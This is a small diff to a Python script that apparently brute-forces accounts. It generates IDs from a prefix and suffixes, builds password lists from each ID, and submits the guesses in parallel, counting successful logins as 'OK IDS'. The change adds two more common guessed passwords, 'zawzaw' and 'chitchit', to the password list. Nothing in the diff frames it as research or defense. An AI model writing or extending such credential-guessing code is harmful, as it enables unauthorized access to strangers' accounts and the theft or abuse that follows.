@@ -105,7 +105,7 @@ def rndmx():
             print(f'[+] USE JAPAN APN COMING MORE OK IDS.......');xnxx()
             for psx in jan:
                 ids = dog+psx
-                passlist = [psx,ids,ids[:8],ids[:7],ids[:6]]
+                passlist = [psx,ids,ids[:8],ids[:7],ids[:6],'zawzaw','chitchit']
                 tanox.submit(sexx,ids,passlist)
     xnxx()
     print(f'[+] TOTAL OK -{str(len(oks))}')
